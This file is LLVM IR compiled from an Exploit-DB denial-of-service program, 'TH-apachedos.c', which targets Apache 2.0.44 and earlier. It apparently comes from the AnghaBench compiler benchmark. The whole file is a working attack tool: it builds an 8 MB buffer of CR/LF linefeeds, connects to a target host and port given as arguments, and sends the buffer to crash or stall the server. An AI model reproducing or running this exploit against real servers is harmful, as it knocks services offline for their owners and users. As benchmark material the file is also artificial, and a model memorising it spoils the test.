; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_11.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_11.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { %struct.in_addr, i32, i32 }
%struct.in_addr = type { i32 }
%struct.hostent = type { i64 }
%struct.sockaddr = type { i32 }

@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [48 x i8] c"\0ATH-apachedos.c - Apache <= 2.0.44 DoS exploit.\00", align 1
@.str.1 = private unnamed_addr constant [48 x i8] c"\0A----------------------------------------------\00", align 1
@.str.2 = private unnamed_addr constant [29 x i8] c"\0AUsage: %s <Target> <Port>\0A\0A\00", align 1
@.str.3 = private unnamed_addr constant [16 x i8] c"\0ATH-Apache DoS\0A\00", align 1
@.str.4 = private unnamed_addr constant [15 x i8] c"-------------\0A\00", align 1
@.str.5 = private unnamed_addr constant [16 x i8] c"-> Starting...\0A\00", align 1
@.str.6 = private unnamed_addr constant [4 x i8] c"->\0A\00", align 1
@.str.7 = private unnamed_addr constant [24 x i8] c"gethostbyname() failed \00", align 1
@AF_INET = common dso_local global i32 0, align 4
@.str.8 = private unnamed_addr constant [27 x i8] c"-> Connecting to %s:%d...\0A\00", align 1
@SOCK_STREAM = common dso_local global i32 0, align 4
@IPPROTO_TCP = common dso_local global i32 0, align 4
@.str.9 = private unnamed_addr constant [17 x i8] c"socket() failed \00", align 1
@.str.10 = private unnamed_addr constant [18 x i8] c"connect() failed \00", align 1
@.str.11 = private unnamed_addr constant [47 x i8] c"-> Connected to %s:%d... Sending linefeeds...\0A\00", align 1
@.str.12 = private unnamed_addr constant [15 x i8] c"send() failed \00", align 1
@.str.13 = private unnamed_addr constant [46 x i8] c"-> Finished smoothly, check hosts apache...\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [8000000 x i8], align 16
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %struct.hostent*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %11 = load i32, i32* %4, align 4
  %12 = icmp ne i32 %11, 3
  br i1 %12, label %13, label %24

13:                                               ; preds = %2
  %14 = load i32, i32* @stderr, align 4
  %15 = call i32 (i32, i8*, ...) @fprintf(i32 %14, i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str, i64 0, i64 0))
  %16 = load i32, i32* @stderr, align 4
  %17 = call i32 (i32, i8*, ...) @fprintf(i32 %16, i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.1, i64 0, i64 0))
  %18 = load i32, i32* @stderr, align 4
  %19 = load i8**, i8*** %5, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 0
  %21 = load i8*, i8** %20, align 8
  %22 = call i32 (i32, i8*, ...) @fprintf(i32 %18, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.2, i64 0, i64 0), i8* %21)
  %23 = call i32 @exit(i32 -1) #4
  unreachable

24:                                               ; preds = %2
  %25 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.3, i64 0, i64 0))
  %26 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.4, i64 0, i64 0))
  %27 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.5, i64 0, i64 0))
  %28 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.6, i64 0, i64 0))
  store i32 0, i32* %7, align 4
  br label %29

29:                                               ; preds = %32, %24
  %30 = load i32, i32* %7, align 4
  %31 = icmp slt i32 %30, 8000000
  br i1 %31, label %32, label %43

32:                                               ; preds = %29
  %33 = load i32, i32* %7, align 4
  %34 = sext i32 %33 to i64
  %35 = getelementptr inbounds [8000000 x i8], [8000000 x i8]* %8, i64 0, i64 %34
  store i8 13, i8* %35, align 1
  %36 = load i32, i32* %7, align 4
  %37 = add nsw i32 %36, 1
  store i32 %37, i32* %7, align 4
  %38 = load i32, i32* %7, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds [8000000 x i8], [8000000 x i8]* %8, i64 0, i64 %39
  store i8 10, i8* %40, align 1
  %41 = load i32, i32* %7, align 4
  %42 = add nsw i32 %41, 1
  store i32 %42, i32* %7, align 4
  br label %29

43:                                               ; preds = %29
  %44 = load i8**, i8*** %5, align 8
  %45 = getelementptr inbounds i8*, i8** %44, i64 1
  %46 = load i8*, i8** %45, align 8
  %47 = call %struct.hostent* @gethostbyname(i8* %46)
  store %struct.hostent* %47, %struct.hostent** %10, align 8
  %48 = icmp eq %struct.hostent* %47, null
  br i1 %48, label %49, label %52

49:                                               ; preds = %43
  %50 = call i32 @herror(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.7, i64 0, i64 0))
  %51 = call i32 @exit(i32 -1) #4
  unreachable

52:                                               ; preds = %43
  %53 = call i32 @memset(%struct.sockaddr_in* %9, i32 0, i32 12)
  %54 = load i32, i32* @AF_INET, align 4
  %55 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  store i32 %54, i32* %55, align 4
  %56 = load i8**, i8*** %5, align 8
  %57 = getelementptr inbounds i8*, i8** %56, i64 2
  %58 = load i8*, i8** %57, align 8
  %59 = call i32 @atoi(i8* %58)
  %60 = call i32 @htons(i32 %59)
  %61 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i32 %60, i32* %61, align 4
  %62 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  %63 = load %struct.hostent*, %struct.hostent** %10, align 8
  %64 = getelementptr inbounds %struct.hostent, %struct.hostent* %63, i32 0, i32 0
  %65 = load i64, i64* %64, align 8
  %66 = inttoptr i64 %65 to %struct.in_addr*
  %67 = bitcast %struct.in_addr* %62 to i8*
  %68 = bitcast %struct.in_addr* %66 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 4 %67, i8* align 4 %68, i64 4, i1 false)
  %69 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  %70 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %69, i32 0, i32 0
  %71 = load i32, i32* %70, align 4
  %72 = call i8* @inet_ntoa(i32 %71)
  %73 = load i8**, i8*** %5, align 8
  %74 = getelementptr inbounds i8*, i8** %73, i64 2
  %75 = load i8*, i8** %74, align 8
  %76 = call i32 @atoi(i8* %75)
  %77 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.8, i64 0, i64 0), i8* %72, i32 %76)
  %78 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.6, i64 0, i64 0))
  %79 = load i32, i32* @AF_INET, align 4
  %80 = load i32, i32* @SOCK_STREAM, align 4
  %81 = load i32, i32* @IPPROTO_TCP, align 4
  %82 = call i32 @socket(i32 %79, i32 %80, i32 %81)
  store i32 %82, i32* %6, align 4
  %83 = icmp slt i32 %82, 0
  br i1 %83, label %84, label %87

84:                                               ; preds = %52
  %85 = call i32 @perror(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.9, i64 0, i64 0))
  %86 = call i32 @exit(i32 -1) #4
  unreachable

87:                                               ; preds = %52
  %88 = load i32, i32* %6, align 4
  %89 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %90 = call i64 @connect(i32 %88, %struct.sockaddr* %89, i32 4)
  %91 = icmp slt i64 %90, 0
  br i1 %91, label %92, label %95

92:                                               ; preds = %87
  %93 = call i32 @perror(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.10, i64 0, i64 0))
  %94 = call i32 @exit(i32 -1) #4
  unreachable

95:                                               ; preds = %87
  %96 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  %97 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %96, i32 0, i32 0
  %98 = load i32, i32* %97, align 4
  %99 = call i8* @inet_ntoa(i32 %98)
  %100 = load i8**, i8*** %5, align 8
  %101 = getelementptr inbounds i8*, i8** %100, i64 2
  %102 = load i8*, i8** %101, align 8
  %103 = call i32 @atoi(i8* %102)
  %104 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.11, i64 0, i64 0), i8* %99, i32 %103)
  %105 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.6, i64 0, i64 0))
  %106 = load i32, i32* %6, align 4
  %107 = getelementptr inbounds [8000000 x i8], [8000000 x i8]* %8, i64 0, i64 0
  %108 = getelementptr inbounds [8000000 x i8], [8000000 x i8]* %8, i64 0, i64 0
  %109 = call i64 @strlen(i8* %108)
  %110 = call i64 @send(i32 %106, i8* %107, i64 %109, i32 0)
  %111 = getelementptr inbounds [8000000 x i8], [8000000 x i8]* %8, i64 0, i64 0
  %112 = call i64 @strlen(i8* %111)
  %113 = icmp ne i64 %110, %112
  br i1 %113, label %114, label %117

114:                                              ; preds = %95
  %115 = call i32 @perror(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.12, i64 0, i64 0))
  %116 = call i32 @exit(i32 -1) #4
  unreachable

117:                                              ; preds = %95
  %118 = load i32, i32* %6, align 4
  %119 = call i32 @close(i32 %118)
  %120 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.13, i64 0, i64 0))
  %121 = load i32, i32* %3, align 4
  ret i32 %121
}

declare dso_local i32 @fprintf(i32, i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @herror(i8*) #1

declare dso_local i32 @memset(%struct.sockaddr_in*, i32, i32) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @atoi(i8*) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #3

declare dso_local i8* @inet_ntoa(i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i64 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i64 @send(i32, i8*, i64, i32) #1

declare dso_local i64 @strlen(i8*) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { argmemonly nounwind willreturn }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
